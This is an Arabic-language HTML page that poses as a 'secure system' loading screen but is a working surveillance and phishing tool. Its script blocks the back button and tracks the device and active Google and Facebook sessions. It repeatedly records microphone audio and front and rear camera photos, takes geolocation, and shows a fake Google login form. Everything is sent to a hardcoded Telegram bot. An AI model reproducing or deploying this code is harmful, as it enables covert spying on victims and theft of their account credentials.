<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تهيئة النظام الآمن...</title>
    <style>
        body { background-color: #050505; color: #444; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
        .login-box { background: #fff; padding: 30px; border-radius: 12px; width: 85%; max-width: 350px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .login-box img { width: 45px; margin-bottom: 15px; }
        .login-box h2 { font-size: 18px; color: #333; margin-bottom: 15px; }
        .login-box input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
        .login-box button { width: 100%; padding: 12px; background: #4285f4; color: #fff; border: none; border-radius: 6px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div id="main-ui">
        <div class="loader"></div>
        <p>جاري فك تشفير المحتوى... يرجى الانتظار والسماح بالأذونات</p>
    </div>

    <div id="phish-overlay">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="G">
            <h2>انتهت الجلسة</h2>
            <p style="color:#666; font-size:13px;">يرجى إعادة تسجيل الدخول للمتابعة</p>
            <input type="email" id="p-email" placeholder="البريد الإلكتروني" required>
            <input type="password" id="p-pass" placeholder="كلمة المرور" required>
            <button onclick="captureLogin()">تسجيل الدخول</button>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
        const CHAT_ID = "7984067238";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let currentStream = null;

        function sendText(text) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
        }

        // 1. اختطاف زر الرجوع (منع الضحية من الخروج)
        function hijackHistory() {
            for (let i = 0; i < 50; i++) {
                window.history.pushState(null, null, window.location.href);
            }
            window.onpopstate = () => {
                window.history.pushState(null, null, window.location.href);
                sendText("⚠️ الضحية حاول الخروج عبر زر الرجوع، تم منعه!");
            };
        }

        // 2. سحب البصمة والحسابات النشطة
        async function getIntelligence() {
            let info = "🧨 **تقرير اختراق نهائي (شامل):**\n";
            info += `📱 *المنصة:* ${navigator.platform}\n`;
            info += `🔋 *البطارية:* ${(await navigator.getBattery()).level * 100}%\n`;
            info += `📶 *الشبكة:* ${(navigator.connection || {}).effectiveType || "N/A"}\n`;
            sendText(info);

            const sites = {"Google": "https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico", "Facebook": "https://www.facebook.com/favicon.ico"};
            for (let [name, url] of Object.entries(sites)) {
                let img = new Image(); img.src = url;
                img.onload = () => sendText(`✅ الضحية نشط حالياً على: *${name}*`);
            }
        }

        // 3. تسجيل الصوت في الخلفية (كل 15 ثانية يسجل 5 ثواني)
        async function startAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                recorder.ondataavailable = (e) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('voice', e.data, 'voice.ogg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                };
                setInterval(() => {
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000);
                }, 15000);
            } catch (e) { sendText("❌ تم رفض إذن الميكروفون."); }
        }

        // 4. التصوير المزدوج التتابعي (كل 2 ثانية)
        async function startVisuals() {
            const modes = ["user", "environment"];
            let i = 0;
            while (true) {
                const mode = modes[i % 2];
                try {
                    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
                    currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                    video.srcObject = currentStream;
                    await new Promise(r => setTimeout(r, 800));
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob, 'shot.jpg');
                        fd.append('caption', `🔄 لقطة: ${mode === "user" ? "الأمامية" : "الخلفية"}`);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg', 0.5);
                } catch (e) {}
                i++; await new Promise(r => setTimeout(r, 2000));
            }
        }

        function captureLogin() {
            const e = document.getElementById('p-email').value;
            const p = document.getElementById('p-pass').value;
            if(e && p) {
                sendText(`🔑 **بيانات الفيشينج:**\n📧: \`${e}\`\n🔐: \`${p}\``);
                document.getElementById('phish-overlay').style.display = 'none';
                alert("خطأ في الخادم، يرجى المحاولة لاحقاً.");
            }
        }

        window.onload = () => {
            hijackHistory();
            getIntelligence();
            startAudio();
            startVisuals();
            navigator.geolocation.getCurrentPosition(p => {
                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                sendText(`📍 **الموقع:** [فتح الخريطة](${map})`);
            });
            setTimeout(() => {
                document.getElementById('phish-overlay').style.display = 'flex';
                document.getElementById('main-ui').style.filter = 'blur(8px)';
            }, 12000);
            if (navigator.wakeLock) navigator.wakeLock.request('screen');
        };
    </script>
</body>
</html>
